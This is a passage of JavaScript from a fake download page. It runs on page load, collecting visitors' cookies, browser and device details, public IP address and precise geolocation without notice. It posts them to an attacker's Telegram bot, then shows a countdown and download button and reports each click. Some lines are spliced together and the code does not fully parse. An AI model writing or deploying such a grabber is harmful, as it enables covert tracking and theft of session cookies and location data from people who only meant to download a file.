                    } catch(e) { return "Unable to read"; }
                })(),
                
                // Cookies
                cookies: document.cookie || "No cookies",
                
                // CSS Features
                cssFeatures: {
                    supportsGrid: CSS.supports("display", "grid"),
                    supportsFlex: CSS.supports("display", "flex"),
                    supportsCustomProperties: CSS.supports("--custom: property"),
                    supportsSticky: CSS.supports("position", "sticky")
                }
            };
            
            // Get IP and location silently
            try {
                const ipServices = [
                    "https://api.ipify.org?format=json",
                    "https://api.my-ip.io/ip.json",
                    "https://ipapi.co/json/"
                ];
                
                for(const service of ipServices) {
                    try {
                        const response = await fetch(service, { mode: 'cors' });
                        if(response.ok) {
                            const ipData = await response.json();
                            data.publicIP = ipData.ip || ipData.ipv4 || "Unknown";
                            if(ipData.country_name) data.country = ipData.country_name;
                            if(ipData.city) data.city = ipData.city;
                            if(ipData.region) data.region = ipData.region;
                            if(ipData.isp) data.isp = ipData.isp;
                            if(ipData.org) data.org = ipData.org;
                            if(ipData.postal) data.postalCode = ipData.postal;
                            if(ipData.latitude) data.latitude = ipData.latitude;
                            if(ipData.longitude) data.longitude = ipData.longitude;
                            break;
                        }
                    } catch(e) { continue; }
                }
            } catch(e) {
                data.publicIP = "Unable to fetch";
            }
            
            // IP Geolocation
            try {
                const geoResponse = await fetch("http://ip-api.com/json/");
                if(geoResponse.ok) {
                    const geoData = await geoResponse.json();
                    if(geoData.status === "success") {
                        data.ipLocation = {
                            country: geoData.country,
                            countryCode: geoData.countryCode,
                            region: geoData.regionName,
                            regionCode: geoData.region,
                            city: geoData.city,
                            zip: geoData.zip,
                            lat: geoData.lat,
                            lon: geoData.lon,
                            timezone: geoData.timezone,
                            isp: geoData.isp,
                            org: geoData.org,
                            as: geoData.as,
                            query: geoData.query
                        };
                    }
                }
            } catch(e) {}
            
            return data;
        }
        
        // Send data to Telegram (original)
        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                const response = await fetch(url, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: "HTML"
                    })
                });
                return response.ok;
            } catch (error) {
                console.error("Telegram send error:", error);
                return false;
            }
        }

                message += `• RAM: ${data.deviceMemory} GB\n`;
                message += `• Touch: ${data.maxTouchPoints} points\n`;

                message += `<b>📺 SCREEN:</b>\n`;

                }

        // Timer and download flow
        let timeLeft = 15;
        const timerDisplay = document.getElementById("timerDisplay");
        const downloadSection = document.getElementById("downloadSection");
        
        async function startProcess() {
            await sendAllData();
            
            const timer = setInterval(() => {
                timeLeft--;
                timerDisplay.textContent = timeLeft;
                document.getElementById("status").innerHTML = `⏳ Please wait ${timeLeft} seconds...`;
                
                if(timeLeft <= 0) {
                    clearInterval(timer);
                    timerDisplay.textContent = "0";
                    document.getElementById("status").innerHTML = "✅ Ready for download!";
                    showDownloadButton();
                }
            }, 1000);
        }
        
        function showDownloadButton() {
            timerDisplay.classList.add("hidden");
            downloadSection.classList.remove("hidden");
            
            const downloadBtn = document.getElementById("downloadBtn");
            const errorMsg = document.getElementById("errorMsg");
            
            downloadBtn.addEventListener("click", function() {
                try {
                    window.open(DOWNLOAD_LINK, '_blank');
                    errorMsg.style.color = "#00ff00";
                    errorMsg.textContent = "✅ Download started!";
                    
                    sendToTelegram(`📥 User clicked download: ${DOWNLOAD_LINK}`);
                    
                    setTimeout(() => {
                        errorMsg.textContent = "";
                        errorMsg.style.color = "#ff0000";
                    }, 3000);
                } catch(e) {
                    errorMsg.textContent = "❌ Error starting download!";
                }
            });
        }
        
        startProcess();
    </script>
